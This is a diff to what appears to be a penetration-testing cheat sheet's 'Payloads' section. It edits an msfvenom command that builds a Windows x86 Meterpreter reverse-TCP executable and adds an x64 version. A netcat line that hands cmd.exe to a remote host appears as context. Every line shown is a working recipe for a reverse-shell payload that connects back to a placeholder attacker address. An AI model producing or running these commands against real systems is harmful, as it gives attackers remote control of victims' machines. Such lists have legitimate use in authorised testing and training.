@@ -58,7 +58,10 @@ run
 ## Payloads
 
 Meterpreter Windows x86 Reverse TCP Staged
-`msfvenom -p windows/meterpreter/reverse_tcp lhost=ipaddress lport=port -f exe > shell-x86.exe`
+`msfvenom -p windows/meterpreter/reverse_tcp lhost=ipaddress lport=port -f exe > shell.exe`
+
+Meterpreter Windows x64 Reverse TCP Staged
+`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ipaddress lport=port -f exe > shell.exe`
 
 Netcat
 `nc.exe -e cmd.exe ipaddress port`
